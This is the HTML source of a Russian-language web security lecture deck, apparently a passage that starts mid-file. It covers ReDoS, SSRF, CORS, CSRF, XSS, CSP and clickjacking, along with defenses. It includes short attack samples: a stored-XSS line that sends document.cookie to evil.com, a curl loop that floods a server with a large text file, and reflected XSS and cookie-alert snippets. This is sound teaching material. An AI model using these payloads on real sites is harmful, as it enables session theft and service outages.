    <h1>–ö—É–ª —Å—Ç–æ—Ä–∏ #3</h1>
    <p class="xsmall">Volga CTF 2019 Finals</p>
</section>

<section class="center">
    <img src="./images/key_gen.png" alt="">
    <p class="fragment">–í—ã—Ö–æ–¥ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª–∏–Ω–æ–π 5-6 —Å–∏–º–≤–æ–ª–æ–≤</p>
    <p class="fragment">–ú–æ–∂–µ–º –ª–µ–≥–∫–æ –ø–µ—Ä–µ–±—Ä–∞—Ç—å –∫–ª—é—á</p>
</section>

<section>
    <h1 class="small">Denial of service</h1>
    <pre class="fragment"><code class="hljs typescript" data-trim>    const { text } = req.body;

    const regex = /^https?:\/\/\w+@\w+\.\w+$/;

    const isValidEmail = Boolean(text.match(regex));

    const statusCode = isValidEmail ? 200 : 400;

    res.sendStatus(statusCode);</code></pre>
</section>

<section>
    <h1 class="small">Denial of service</h1>
    <pre><code class="hljs typescript" data-trim>    const { text } = req.body;

    const regex = /^https?:\/\/\w+@\w+\.\w+$/;

    const isValidEmail = Boolean(text.match(regex)); // ‚ö†Ô∏è

    const statusCode = isValidEmail ? 200 : 400;

    res.sendStatus(statusCode);</code></pre>
</section>

<section>
    <h1 class="small">Denial of service</h1>
    <pre><code class="hljs typescript" data-trim>
    const isValidEmail = Boolean(text.match(regex));</code></pre>
    <pre class="fragment"><code class="hljs bash" data-trim>    while (true); do
        curl $URL -d '{ text: $(cat "–í–æ–π–Ω–∞ –∏ –º–∏—Ä.txt") }';
    done</code></pre>
    <div class="fragment smoke">
        <img src="./images/22-smoke.jpg" alt="–î–≤–∏–≥–∞—Ç–µ–ª—å –ø–µ—Ä–µ–≥—Ä–µ–ª—Å—è">
    </div>
</section>

<section>
    <h1 class="small">Distributed Denial of service</h1>
    <img class="fragment" src="./images/19-dos.jpg" alt="–°—Ö–µ–º–∞ –∞—Ç–∞–∫–∏ DDOS">
</section>

<section>
    <h1>–û—à–∏–±–∫–∏ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã</h1>
    <ul class="list">
        <li>–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è</li>
        <li>–ê—Ç–∞–∫–∞ SSRF</li>
    </ul>
</section>

<section>
    <h1 class="small">–ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</h1>
    <img src="./images/05-auth.jpg" alt="–°—Ö–µ–º–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∫–∞—Ü–∏–∏ –≤ –Ø–Ω–¥–µ–∫—Å–µ">
</section>

<section>
    <h1 class="small">–ê—Ç–∞–∫–∞ Server Side Request Forgery</h1>
    <img src="./images/06-ssrf.jpg" alt="–°—Ö–µ–º–∞ –∞—Ç–∞–∫–∏ SSRF">
</section>

<section>
    <h1 class="small">–ê—Ç–∞–∫–∞ Server Side Request Forgery</h1>
    <img src="./images/20-ssrf-redirect.jpg" alt="–°—Ö–µ–º–∞ –∞—Ç–∞–∫–∏ SSRF">
</section>

<section>
    <h1 class="small">–ê—Ç–∞–∫–∞ Server Side Request Forgery</h1>
    <img src="./images/07-ssrf-solve.jpg" alt="–°—Ö–µ–º–∞ –∞—Ç–∞–∫–∏ SSRF">
</section>

<section>
    <h1>–í –Ø–Ω–¥–µ–∫—Å–µ</h1>
    <ul class="list">
        <li class="fragment">Security Review</li>
        <li class="fragment">–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ</li>
        <li class="fragment">–ë–µ–∑–æ–ø–∞—Å–Ω—ã–µ –æ–±—â–∏–µ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã</li>
        <li class="fragment">–ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</li>
        <li class="fragment">–°–µ–∫—Ä–µ—Ç—ã –∏ —Ç–æ–∫–µ–Ω—ã</li>
    </ul>
</section>

<section class="center">
    <h1>Client side</h1>
</section>

<section>
    <h1>Same Origin Policy</h1>
    <p class="fragment">Origin = scheme + domain + port</p>
    <div>
        <pre class="fragment"><code class="hljs nginx" data-noescape data-trim>    <mark>http://a.yandex.ru</mark>/dir1 </code></pre>
        <pre class="fragment"><code class="hljs nginx" data-noescape data-trim>    <mark>http://a.yandex.ru</mark>/dir1/dir2 </code></pre>
        <pre class="fragment"><code class="hljs nginx" data-noescape data-trim>    <mark>https://a.yandex.ru</mark>/dir1 </code></pre>
        <pre class="fragment"><code class="hljs nginx" data-noescape data-trim>    <mark>http://a.yandex.ru:8080</mark>/dir1 </code></pre>
        <pre class="fragment"><code class="hljs nginx" data-noescape data-trim>    <mark>http://b.yandex.ru</mark>/dir1 </code></pre>
    </div>
</section>

<section>
    <h1>Cookie</h1>
    <pre class="fragment"><code class="hljs" data-noescape data-trim>
    Set-Cookie: id=1111; Path=/admin/
    Set-Cookie: id=2222; Path=/; Domain=my.example.com
    Set-Cookie: id=3333; Path=/; Http-Only; secure</code></pre>
</section>

<section>
    <h1>Cookie</h1>
    <pre><code class="hljs" data-noescape data-trim>
    Set-Cookie: id=1111; Path=/admin/
    Set-Cookie: id=2222; Path=/; Domain=my.example.com
    Set-Cookie: id=3333; Path=/; <mark>Http-Only</mark>; <mark>secure</mark></code></pre>
    <p class="fragment xsmall left pad-left-small">
        <strong>Http-Only</strong> - –∫—É–∫–∞ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞ –∏–∑ JS
    </p>
    <p class="fragment xsmall left pad-left-small">
        <strong>Secure</strong> - –∫—É–∫–∞ –ø–µ—Ä–µ–¥–∞—ë—Ç—Å—è —Ç–æ–ª—å–∫–æ –ø–æ HTTPS
    </p>
</section>

<section>
    <h1 class="small">Cross-Origin Resource Sharing</h1>
    <pre class="fragment"><code class="hljs nginx">
    GET /handler/ HTTP/1.1
    Host: myawesomedomain.com
    Origin: https://attacker.com
    Cookie: session=123</code></pre>
    <pre class="fragment"><code class="hljs">
    HTTP/1.0 200 OK
    Access-Control-Allow-Origin: https://attacker.com
    Access-Control-Allow-Credentials: true</code></pre>
</section>

<section>
    <h1>Cross site request forgery</h1>
    <img class="fragment" src="./images/08-csrf.jpg" alt="–°—Ö–µ–º–∞ –∞—Ç–∞–∫–∏ CSRF">
</section>

<section>
    <h1>Cross site request forgery</h1>
    <pre><code class="hljs nginx" data-noescape data-trim>
        GET /form HTTP/1.1
        Host: vulnerable.com

        
        HTTP/1.1 200 OK
        Set-Cookie: crsf-token=keyboard-cat
    </code></pre>
    <pre class="fragment">
        <code class="hljs nginx" data-noescape data-trim>
        POST /modify HTTP/1.0
        Host: vulnerable.com
        X-CSRF-Token: keyboard-cat
    </code></pre>
</section>

<section>
    <dl>
        <dt class="small center">Cross-site scripting (XSS)</dt>
        <dd class="fragment definition">
            <strong>–ê—Ç–∞–∫–∞</strong>, –ø—Ä–∏ –∫–æ—Ç–æ—Ä–æ–π –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥ <strong>–≤–Ω–µ–¥—Ä—è–µ—Ç—Å—è</strong>
            –≤ –∫–æ–¥ –≤–∞—à–µ–≥–æ —Å–∞–π—Ç–∞ –∏ –º–æ–∂–µ—Ç –±—ã—Ç—å <strong>–∑–∞–ø—É—â–µ–Ω</strong>
        </dd>
    </dl>
</section>

<section>
    <h1 class="small center">Cross-site scripting (XSS)</h1>
    <ul class="list center">
        <li class="fragment" data-fragment-index="0">Reflected</li>
        <li class="fragment" data-fragment-index="0"><pre><code class="hljs" >http://example.com/search.php?q=&lt;script>DoSomething();&lt;/script></code></pre></li>
        <li class="fragment" data-fragment-index="1">Stored</li>
        <li class="fragment" data-fragment-index="1"><pre><code class="hljs">
&lt;script>document.location="http://evil.com/?"+document.cookie&lt;/script></code></pre></li>
    </ul>
</section>

<section>
    <pre><code class="hljs html">    &lt;textarea id=&quot;textarea&quot; type=&quot;text&quot;&gt;&lt;/textarea&gt;
    &lt;button id=&quot;button&quot;&gt;–°–æ—Ö—Ä–∞–Ω–∏—Ç—å&lt;/button&gt;
    &lt;div id=&quot;result&quot;&gt;&lt;/div&gt;
    &lt;script&gt;
        button.addEventListener(&apos;click&apos;, function () {
            result.innerHTML = textarea.value;
        });
    &lt;script&gt;</code></pre>
    <div class="fragment blog-wrapper">
        <textarea id="textarea" class="blog__textarea"></textarea>
        <button id="button" class="blog__button">–°–æ—Ö—Ä–∞–Ω–∏—Ç—å</button>
        <div class="blog">
            <img class="blog__author" src="./images/17-author.png" alt="–ê–≤—Ç–æ—Ä">
            <p class="blog__description">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞–ø–∏—Å–∞–ª –≤ 25 –∞–ø—Ä–µ–ª—è –≤ 17:45</p>
            <p id="result" class="blog__result"></p>
        </div>
        <script>
            button.addEventListener('click', function () {
                result.innerHTML = textarea.value;
            });
        </script>
    </div>
</section>

<section>
    <h1 class="small">Cross-Site Scripting</h1>
    <ul class="list">
        <li class="fragment">–°–∞–Ω–∏—Ç–∞–π–∑–∏–Ω–≥ / —ç—Å–∫–µ–π–ø–∏–Ω–≥ –¥–∞–Ω–Ω—ã—Ö –Ω–∞ –≤—ã—Ö–æ–¥–µ</li>
        <li class="fragment">–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ñ—Ä–µ–π–º–≤–æ—Ä–∫–∏</li>
        <li class="fragment">–ë–µ—Å–∫—É–∫–æ–≤—ã–π –¥–æ–º–µ–Ω –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö —Å–∫—Ä–∏–ø—Ç–æ–≤</li>
        <li class="fragment">–ó–∞–≥–æ–ª–æ–≤–æ–∫ X-XSS-Protection</li>
        <li class="fragment">Content Security Policy</li>
    </ul>
</section>

<section>
    <h1 class="small">–°–∞–Ω–∏—Ç–∞–π–∑–∏–Ω–≥</h1>
    <pre><code class="hljs typescript html">    import sanitizeHtml from 'sanitize-html';

    const evilHtml = `
        &lt;p style="background-image: url('attacker.com')"&gt;
            Hello, world!
        &lt;/p&gt;
        &lt;script&gt;alert(document.cookie);&lt;/script&gt;
    `;

    const kindHtml = sanitizeHtml(evilHtml, {
        allowedTags: ['a', 'p', 'div'],
        allowedAttributes: { a: ['href'] }
    });
    // <p>Hello, world!</p>
    </code></pre>
</section>

<section class="center">
    <h1><a href="https://owasp.org/www-community//xss-filter-evasion-cheatsheet">XSS Filter Evasion</a></h1>
</section>

<section>
    <h1>Content Security Policy</h1>
    <pre><code class="hljs">
    Content-Security-Policy:
        default-src 'self';
        img-src *;
        script-src trusted.com;</code></pre>
</section>

<section>
    <h1>Content Security Policy</h1>
    <pre><code class="hljs nginx" data-noescape data-trim>
    Content-Security-Policy:
        media-src https://yandex.ru</code>
    </pre>
</section>

<section>
    <h1>Content Security Policy</h1>
    <pre><code class="hljs nginx" data-noescape data-trim>
    Content-Security-Policy:
        media-src <mark>https</mark>://yandex.ru</code>
    </pre>
    <p class="fragment">
        <a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#Directives">
            –°–ø–∏—Å–æ–∫ –¥–∏—Ä–µ–∫—Ç–∏–≤ CSP
        </a>
    </p>
</section>

<section>
    <h1 class="small">ClickJacking</h1>
    <div class="clickjacking">
        <img class="clickjacking__image" src="./images/18-clickjacking.png" alt="–ò–ª–ª—é—Å—Ç—Ä–∞—Ü–∏—è –∞—Ç–∞–∫–∏ Clickjacking">
        <pre class="clickjacking__code"><code class="hljs html">    &lt;iframe src=&quot;https://vk.com&quot;&gt;
    &lt;/iframe&gt;

    <a href="http://attacker.com">
        Click to WIN!
    </a></code></pre>
    </div>
</section>

<section>
    <h1 class="small">ClickJacking</h1>
    <pre>
        <code class="hljs" data-noescape data-trim>    
    X-Frame-Options: SAMEORIGIN
    X-Frame-Options: DENY
    X-Frame-Options: ALLOW-FROM http://trusted.com</code>
    </pre>
</section>

<section>
    <h1 class="small">ClickJacking</h1>
    <pre>
        <code class="hljs" data-noescape data-trim>    
    X-Frame-Options: SAMEORIGIN
    X-Frame-Options: DENY
    <strike>X-Frame-Options: ALLOW-FROM http://trusted.com</strike>
</code></pre>
    <p class="fragment xxsmall left pad-left-small">
        * –ù–æ –µ—Å—Ç—å –¥–∏—Ä–µ–∫—Ç–∏–≤–∞ CSP <a target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors">frame-ancestors</a>
    </p>
</section>

<section>
    <h1>–ú–Ω–æ–≥–æ–∫—Ä–∞—Ç–Ω–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ä–º—ã</h1>
    <div class="captcha">
        <img src="./images/11-captcha.jpg" alt="–ö–∞–ø—á–∞">
    </div>
</section>

<section>
    <h1 class="small">–ß—Ç–æ –¥–µ–ª–∞—Ç—å, —á—Ç–æ–±—ã –±—ã–ª–æ –±–µ–∑–æ–ø–∞—Å–Ω–µ–µ</h1>
    <ul class="list">
        <li class="fragment">–ù–µ –¥–æ–≤–µ—Ä—è–π—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–º –¥–∞–Ω–Ω—ã–º</li>
        <li class="fragment">–ê–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è (–∞–Ω–∞–ª–∏–∑ –∫–æ–¥–∞, —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è)</li>
        <li class="fragment">–û–±—â–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω—ã–µ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã</li>
        <li class="fragment">
            <pre><code class="hljs npm" data-trim data-noescape>npm audit</code></pre>
        </li>
    </ul>
</section>

<section>
    <h1>–°—Å—ã–ª–∫–∏</h1>
    <ul class="list">
        <li class="fragment">
            <a href="https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents" target="_blank">–ì–∞–π–¥ OWASP v4</a>
        </li>
        <li class="fragment">
            <a href="https://academy.yandex.ru/events/system_administration/msk-2018/" target="_blank">–õ–µ–∫—Ü–∏–∏ –®–ò–ë</a>
        </li>
        <li class="fragment"><a href="https://ulearn.me/course/hackerdom/">–•–∞–∫–µ—Ä–¥–æ–º</a></li>
        <li class="fragment">
            <a href="https://html5sec.org" target="_blank">HTML5 Security Cheatsheet</a>
        </li>
        <li class="fragment">
            <a href="https://helmetjs.github.io" target="_blank">Helmet.js</a>
        </li>
    </ul>
</section>

<section class="center">
    <h1>??</h1>
</section>

</div></div>

<script src="../../@lib/core.js"></script>
</body>
</html>